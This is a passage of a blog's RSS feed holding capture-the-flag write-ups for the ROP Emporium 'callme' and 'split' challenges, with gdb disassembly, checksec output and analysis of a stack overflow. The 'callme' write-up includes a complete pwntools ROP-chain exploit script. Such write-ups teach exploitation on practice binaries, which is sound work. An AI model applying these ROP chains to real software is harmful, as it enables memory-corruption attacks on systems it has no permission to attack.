   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000092a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;272&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the disassembly code above, we can we are comparing our arguments in which we are passing to callme_one function. if the string values are not equal to values passed to the rdi, rsi and rdx registers the program exits, otherwise we get a flag.&lt;/p&gt;
&lt;p&gt;From previous knowledge of solving other challenges, we need to overwrite the return address with the pop rdi, pop rsi, pop rdx, ret gadget and call each function in a sequential manner.&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;Fully working rop chain code is as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;pwn&lt;/span&gt;

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;latin-1&amp;#34;&lt;/span&gt;
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;warnings&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;simplefilter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;

io &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./callme&amp;#39;&lt;/span&gt;)

pop_rdi_rsi_rdx &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x0040093c&lt;/span&gt;)  &lt;span style=&#34;color:#776e71&#34;&gt;#pop rdi; pop rsi; pop rdx; ret gadget&lt;/span&gt;
arg1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0xdeadbeefdeadbeef&lt;/span&gt;)
arg2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0xcafebabecafebabe&lt;/span&gt;)
arg3 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0xd00df00dd00df00d&lt;/span&gt;)


callme_one_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x0000000000400720&lt;/span&gt;)
callme_two_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x0000000000400740&lt;/span&gt;)
callme_three_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00000000004006f0&lt;/span&gt;)

&lt;span style=&#34;color:#776e71&#34;&gt;#call the callme_one function&lt;/span&gt;
callme_one &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pop_rdi_rsi_rdx
callme_one &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg1
callme_one &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg2
callme_one &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg3
callme_one &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; callme_one_addr

&lt;span style=&#34;color:#776e71&#34;&gt;#callme_two function&lt;/span&gt;
callme_two &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pop_rdi_rsi_rdx
callme_two &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg1
callme_two &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg2
callme_two  &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg3
callme_two &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; callme_two_addr

&lt;span style=&#34;color:#776e71&#34;&gt;#callme_three function&lt;/span&gt;
callme_three &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pop_rdi_rsi_rdx
callme_three &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg1
callme_three &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg2
callme_three &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg3
callme_three &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; callme_three_addr

payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;32&lt;/span&gt;   &lt;span style=&#34;color:#776e71&#34;&gt;#fill the buffer&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#776e71&#34;&gt;#overwrite the rbp&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; callme_one
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; callme_two
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; callme_three


io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;writeafter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;, payload)

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;info(io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;clean()&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;decode())

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Successful execution of the above code, we get rewarded with a correct flag.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/callme-flag.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/callme-flag.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Return-Oriented Programming - Split</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-split/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:37 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-split/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/ropemporium/split.jpg" alt="Featured image of post Return-Oriented Programming - Split" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Challenge Description&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The elements that allowed you to complete ret2win are still present, they&amp;rsquo;ve just been split apart.
Find them and recombine them using a short ROP chain&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website &lt;a class=&#34;link&#34; href=&#34;https://ropemporium.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ropemporium&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;First we check the binary protections enabled on the downloaded. Only &lt;strong&gt;NX&lt;/strong&gt; (Not executable) is enabled on the device according to checksec binary utility as shown in the image below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:split$ checksec --file&lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From analysis of binary we use gdb debugger in order to analyze the functions present in the binary in order to understand the logic. We disassemble &lt;strong&gt;pwnme&lt;/strong&gt; function as in the image below.The function looks familiar as for the ret2win function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e8&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006e9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006ec&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;sub&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006f0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006f4&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006f9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    esi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004006fe&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400701&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400580&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;memset@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400706&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x400810&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040070b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400710&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x40083c&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400715&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040071a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400570&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;printf@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040071f&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;55&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400723&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x60&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400728&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rsi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040072b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400730&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400590&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;read@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400735&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x40083f&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040073a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400550&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040073f&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400740&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;88&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;leave&lt;/span&gt;  
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400741&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;89&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above code, we are filling  a buffer of size 0x20(32bytes) with a constant byte of zero. &lt;strong&gt;memset&lt;/strong&gt; is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Next function is &lt;strong&gt;read&lt;/strong&gt; function, which reads for user input from the standard input file descriptor and stores in the specified buffer. From disassembled code, we are reading &lt;strong&gt;0x60&lt;/strong&gt; bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;ssize_t &lt;span style=&#34;color:#06b6ef&#34;&gt;read&lt;/span&gt;(&lt;span style=&#34;color:#fec418&#34;&gt;int&lt;/span&gt; fd, &lt;span style=&#34;color:#fec418&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;buf, size_t count);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For this challenge we don`t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called &lt;strong&gt;usefulFunction&lt;/strong&gt;. The usefulFunction, does listing of the files in the directory when called by the function.&lt;/p&gt;
